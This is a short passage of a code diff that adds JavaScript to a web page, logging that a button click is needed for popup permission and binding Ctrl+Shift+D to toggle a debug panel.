+log("User must CLICK the button (required for popup permission).", "d-info");
+
+// ============ Keyboard shortcut: Ctrl+Shift+D for full debug ============
+document.addEventListener("keydown", function(e) {
+  if (e.ctrlKey && e.shiftKey && e.key === "D") {
+    e.preventDefault();
+    dEl.classList.toggle("show");
+    log("Debug panel toggled", "d-info");
+  }
+});
 </script>
 </body>
 </html>
